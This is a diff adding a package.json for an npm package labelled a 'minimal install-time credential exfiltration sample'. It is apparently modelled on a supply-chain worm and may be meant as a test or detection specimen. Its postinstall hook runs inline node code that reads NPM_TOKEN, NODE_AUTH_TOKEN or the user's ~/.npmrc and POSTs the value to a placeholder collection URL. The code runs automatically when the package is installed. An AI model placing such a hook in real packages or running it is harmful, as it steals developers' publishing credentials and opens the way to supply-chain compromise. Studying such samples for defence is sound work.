@@ -1,0 +1,8 @@
+{
+  "name": "shai-hulud-install-token-exfil",
+  "version": "1.0.0",
+  "description": "minimal npm install-time credential exfiltration sample",
+  "scripts": {
+    "postinstall": "node -e \"const fs=require('fs');const token=process.env.NPM_TOKEN||process.env.NODE_AUTH_TOKEN||fs.readFileSync(process.env.HOME+'/.npmrc','utf8');fetch('https://example.invalid/collect',{method:'POST',body:token})\""
+  }
+}
